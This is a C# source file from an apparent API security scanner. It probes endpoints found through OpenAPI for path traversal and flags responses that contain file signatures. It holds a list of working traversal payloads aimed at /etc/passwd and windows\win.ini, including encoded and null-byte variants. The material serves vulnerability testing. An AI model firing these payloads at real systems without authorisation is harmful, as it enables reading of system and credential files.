namespace API_Tester;

public partial class MainPage
{
    /*
    Path Traversal Payloads

    Purpose:
    Defines payloads used to test whether an API or application is vulnerable
    to directory traversal (path traversal) attacks.

    Threat Model:
    Path traversal vulnerabilities occur when user-controlled input is used
    to construct file system paths without proper validation or sanitization.
    Attackers may attempt to escape the intended directory and access files
    outside the application's permitted scope.

    Common techniques involve using relative path sequences such as "../"
    to move up directory levels.

    Example attack pattern:

        ../../../../etc/passwd

    If the application directly concatenates user input into file paths,
    an attacker may gain access to sensitive files on the server.

    Attack scenarios include:

        - reading system configuration files
        - accessing application source code
        - retrieving credentials or secrets
        - downloading restricted resources

    Attackers often attempt various encoding techniques to bypass filters,
    including URL encoding, double encoding, or alternate path separators.

    Test Strategy:
    These payloads represent common traversal sequences used to probe
    file access parameters such as file names, download paths, or
    resource identifiers.

    Potential Impact:
    If path traversal is possible, attackers may be able to:

        - read sensitive system files
        - access configuration files containing credentials
        - download application code
        - expose internal system structure

    Expected Behavior:
    Applications should normalize and validate file paths, restrict file
    access to approved directories, and reject input containing traversal
    sequences or unexpected path characters.
    */
    
    private static string[] GetPathTraversalPayloads() =>
    [
        "../../../../etc/passwd",
        "../../../etc/passwd",
        "..%2f..%2f..%2f..%2fetc%2fpasswd",
        "..%252f..%252f..%252f..%252fetc%252fpasswd",
        "..\\..\\..\\..\\windows\\win.ini",
        "..%5c..%5c..%5c..%5cwindows%5cwin.ini",
        "..%255c..%255c..%255c..%255cwindows%255cwin.ini",
        "../../../../etc/passwd%00",
        "..\\..\\..\\..\\boot.ini",
        "/etc/passwd",
        "C:\\windows\\win.ini",
        "....//....//....//etc/passwd"
    ];

    private HttpRequestMessage FormatPathTraversalRequest(
        Uri endpoint,
        string payload,
        PathTraversalVector vector,
        string[] bodyFields,
        string? queryField = null)
    {
        return vector switch
        {
            PathTraversalVector.Query => BuildPathTraversalQueryRequest(endpoint, payload, queryField ?? "file"),
            PathTraversalVector.Json => BuildPathTraversalJsonRequest(endpoint, payload, bodyFields),
            PathTraversalVector.Form => BuildPathTraversalFormRequest(endpoint, payload, bodyFields),
            PathTraversalVector.Path => BuildPathTraversalPathRequest(endpoint, payload),
            _ => new HttpRequestMessage(HttpMethod.Get, endpoint)
        };
    }

    private HttpRequestMessage BuildPathTraversalQueryRequest(Uri endpoint, string payload, string queryField)
    {
        var queryUri = AppendQuery(endpoint, new Dictionary<string, string> { [queryField] = payload });
        return new HttpRequestMessage(HttpMethod.Get, queryUri);
    }

    private static HttpRequestMessage BuildPathTraversalJsonRequest(Uri endpoint, string payload, string[] bodyFields)
    {
        var req = new HttpRequestMessage(HttpMethod.Post, endpoint);
        req.Content = new StringContent(
            JsonSerializer.Serialize(bodyFields.ToDictionary(k => k, _ => payload, StringComparer.OrdinalIgnoreCase)),
            Encoding.UTF8,
            "application/json");
        return req;
    }

    private static HttpRequestMessage BuildPathTraversalFormRequest(Uri endpoint, string payload, string[] bodyFields)
    {
        var formPayload = string.Join("&", bodyFields.Select(k => $"{Uri.EscapeDataString(k)}={Uri.EscapeDataString(payload)}"));
        var req = new HttpRequestMessage(HttpMethod.Post, endpoint);
        req.Content = new StringContent(formPayload, Encoding.UTF8, "application/x-www-form-urlencoded");
        return req;
    }

    private HttpRequestMessage BuildPathTraversalPathRequest(Uri endpoint, string payload)
    {
        var pathUri = AppendPathSegment(endpoint, payload);
        return new HttpRequestMessage(HttpMethod.Get, pathUri);
    }

    private enum PathTraversalVector
    {
        Query,
        Json,
        Form,
        Path
    }

    private async Task<string> RunPathTraversalTestsAsync(Uri baseUri)
    {
        var openApi = await GetOpenApiProbeContextAsync(baseUri);
        var payloads = GetPathTraversalPayloads();
        var queryFields = new[] { "file", "path", "filename", "template", "document", "resource", "include" };
        var scanDepth = GetScanDepthProfile();
        payloads = GetManualPayloadsOrDefault(payloads, ManualPayloadCategory.Path);
        payloads = LimitByScanDepth(payloads, fastCount: 5, balancedCount: 8);
        var mergedQueryFields = queryFields
        .Concat(openApi.QueryParameterNames)
        .Where(x => !string.IsNullOrWhiteSpace(x))
        .Where(x => !openApi.NonStringQueryParameterNames.Contains(x, StringComparer.OrdinalIgnoreCase))
        .Distinct(StringComparer.OrdinalIgnoreCase)
        .ToArray();
        queryFields = LimitByScanDepth(mergedQueryFields, fastCount: 3, balancedCount: 6);
        var bodyFields = openApi.BodyPropertyNames.Count > 0
        ? LimitByScanDepth(
        openApi.BodyPropertyNames
        .Where(x => !openApi.NonStringBodyPropertyNames.Contains(x, StringComparer.OrdinalIgnoreCase))
        .ToArray(),
        fastCount: 2,
        balancedCount: 4)
        : new[] { "file", "path", "filename" };
        if (queryFields.Length == 0)
        {
            queryFields = new[] { "file", "path", "filename" };
        }
        if (bodyFields.Length == 0)
        {
            bodyFields = new[] { "file", "path", "filename" };
        }
        var endpoints = (openApi.TargetEndpoints.Count > 0 ? openApi.TargetEndpoints : new List<Uri> { baseUri })
        .Take(scanDepth == "fast" ? 2 : scanDepth == "balanced" ? 4 : 8)
        .ToList();
        var includeJsonAndForm = scanDepth != "fast";
        var includePathVector = scanDepth == "deep";
        var signatures = new[]
        {
            "root:x:",
            "/bin/bash",
            "/etc/passwd",
            "[extensions]",
            "boot.ini",
            "windows\\",
            "permission denied",
            "access denied"
        };

        var findings = new List<string>();
        var hitCount = 0;
        var noResponse = 0;
        var attempts = 0;

        foreach (var endpoint in endpoints)
        {
            foreach (var payload in payloads)
            {
                foreach (var field in queryFields)
                {
                    var queryResponse = await SafeSendAsync(() => FormatPathTraversalRequest(endpoint, payload, PathTraversalVector.Query, bodyFields, field));
                    var queryBody = await ReadBodyAsync(queryResponse);
                    attempts++;
                    if (queryResponse is null)
                    {
                        noResponse++;
                        continue;
                    }
                    else if (ContainsAny(queryBody, signatures))
                    {
                        hitCount++;
                    }
                }

                if (includeJsonAndForm)
                {
                    var jsonResponse = await SafeSendAsync(() => FormatPathTraversalRequest(endpoint, payload, PathTraversalVector.Json, bodyFields));
                    var jsonBody = await ReadBodyAsync(jsonResponse);
                    attempts++;
                    if (jsonResponse is null)
                    {
                        noResponse++;
                    }
                    else if (ContainsAny(jsonBody, signatures))
                    {
                        hitCount++;
                    }

                    var formResponse = await SafeSendAsync(() => FormatPathTraversalRequest(endpoint, payload, PathTraversalVector.Form, bodyFields));
                    var formBody = await ReadBodyAsync(formResponse);
                    attempts++;
                    if (formResponse is null)
                    {
                        noResponse++;
                    }
                    else if (ContainsAny(formBody, signatures))
                    {
                        hitCount++;
                    }
                }

                if (includePathVector)
                {
                    var pathResponse = await SafeSendAsync(() => FormatPathTraversalRequest(endpoint, payload, PathTraversalVector.Path, bodyFields));
                    var pathBody = await ReadBodyAsync(pathResponse);
                    attempts++;
                    if (pathResponse is null)
                    {
                        noResponse++;
                    }
                    else if (ContainsAny(pathBody, signatures))
                    {
                        hitCount++;
                    }
                }
            }
        }

        var vectorSummary = includePathVector ? "query + JSON body + form + path" : includeJsonAndForm ? "query + JSON body + form" : "query";
        findings.Add(noResponse == attempts
        ? "No responses received across traversal probes."
        : hitCount > 0
        ? $"Potential risk: traversal indicators observed on {hitCount}/{attempts} probes."
        : "No obvious traversal file-content indicators across tested vectors.");
        AddVerbosePayloadDetails(findings, payloads, queryFields, bodyFields);

        return FormatSection("Path Traversal", baseUri, findings);
    }

}

